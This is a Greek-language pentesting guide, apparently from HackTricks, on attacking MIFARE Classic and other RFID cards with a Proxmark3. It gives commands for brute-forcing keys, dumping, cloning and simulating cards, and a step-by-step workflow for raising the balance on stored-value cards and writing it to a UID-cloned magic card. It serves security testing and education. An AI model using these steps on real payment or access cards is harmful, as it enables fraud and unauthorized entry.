# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Επίθεση σε RFID Systems με Proxmark3

Το πρώτο πράγμα που πρέπει να κάνετε είναι να αποκτήσετε ένα [**Proxmark3**](https://proxmark.com) και να [**εγκαταστήσετε το λογισμικό και τις εξαρτήσει**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**ς**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Επίθεση σε MIFARE Classic 1KB

Διαθέτει **16 sectors**, καθένας από τους οποίους έχει **4 blocks**, και κάθε block περιέχει **16B**. Το UID βρίσκεται στο sector 0, block 0 (και δεν μπορεί να τροποποιηθεί).\
Για να αποκτήσετε πρόσβαση σε κάθε sector, χρειάζεστε **2 keys** (**A** και **B**), οι οποίες αποθηκεύονται στο **block 3 κάθε sector** (sector trailer). Το sector trailer αποθηκεύει επίσης τα **access bits**, τα οποία παρέχουν δικαιώματα **read και write** σε **κάθε block** χρησιμοποιώντας τα 2 keys.\
Τα 2 keys είναι χρήσιμα για την παροχή δικαιωμάτων read, αν γνωρίζετε το πρώτο, και write, αν γνωρίζετε το δεύτερο (για παράδειγμα).

Μπορούν να πραγματοποιηθούν διάφορες επιθέσεις
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Το Proxmark3 επιτρέπει την εκτέλεση άλλων ενεργειών, όπως το **eavesdropping** σε μια **Tag to Reader communication**, με σκοπό την προσπάθεια εύρεσης ευαίσθητων δεδομένων. Σε αυτή την περίπτωση, μπορείτε απλώς να κάνετε sniffing της επικοινωνίας και να υπολογίσετε το χρησιμοποιούμενο key, επειδή οι **cryptographic operations που χρησιμοποιούνται είναι αδύναμες** και, γνωρίζοντας το plain και το cipher text, μπορείτε να το υπολογίσετε (εργαλείο `mfkey64`).<sup>[[3]](#references)</sup>

#### Γρήγορο workflow του MiFare Classic για κατάχρηση αποθηκευμένης αξίας

Όταν τα terminals αποθηκεύουν υπόλοιπα σε Classic cards, μια τυπική end-to-end ροή είναι η εξής:<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Σημειώσεις

- `hf mf autopwn` ενορχηστρώνει επιθέσεις τύπου nested/darkside/HardNested, ανακτά κλειδιά και δημιουργεί dumps στον φάκελο dumps του client.<sup>[[1]](#references)</sup>
- Η εγγραφή του block 0/UID λειτουργεί μόνο σε magic gen1a/gen2 cards. Οι κανονικές Classic cards έχουν UID μόνο για ανάγνωση.<sup>[[2]](#references)</sup>
- Πολλές εγκαταστάσεις χρησιμοποιούν Classic "value blocks" ή απλά checksums. Βεβαιωθείτε ότι όλα τα διπλότυπα/συμπληρωματικά πεδία και τα checksums είναι συνεπή μετά την επεξεργασία.<sup>[[4]](#references)</sup>

Δείτε μια μεθοδολογία υψηλότερου επιπέδου και mitigations στο:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw Commands

Τα συστήματα IoT μερικές φορές χρησιμοποιούν **μη επώνυμες ή μη εμπορικές tags**. Σε αυτήν την περίπτωση, μπορείτε να χρησιμοποιήσετε το Proxmark3 για να στείλετε προσαρμοσμένες **raw commands προς τις tags**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Με αυτές τις πληροφορίες θα μπορούσατε να αναζητήσετε πληροφορίες σχετικά με την κάρτα και τον τρόπο επικοινωνίας μαζί της. Το Proxmark3 επιτρέπει την αποστολή raw εντολών, όπως: `hf 14a raw -p -b 7 26`

### Scripts

Το λογισμικό Proxmark3 περιλαμβάνει μια προφορτωμένη λίστα από **automation scripts**, τα οποία μπορείτε να χρησιμοποιήσετε για την εκτέλεση απλών εργασιών. Για να ανακτήσετε την πλήρη λίστα, χρησιμοποιήστε την εντολή `script list`. Στη συνέχεια, χρησιμοποιήστε την εντολή `script run`, ακολουθούμενη από το όνομα του script:
```
proxmark3> script run mfkeys
```
Μπορείτε να δημιουργήσετε ένα script για **fuzz tag readers**, οπότε, αφού αντιγράψετε τα δεδομένα μιας **έγκυρης κάρτας**, απλώς γράψτε ένα **Lua script** που θα **randomize** ένα ή περισσότερα τυχαία **bytes** και ελέγξτε αν ο **reader crashes** σε κάποια επανάληψη.

## Αναφορές

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [Δήλωση της NXP σχετικά με το MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Εκμετάλλευση ευπάθειας κάρτας NFC στο KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
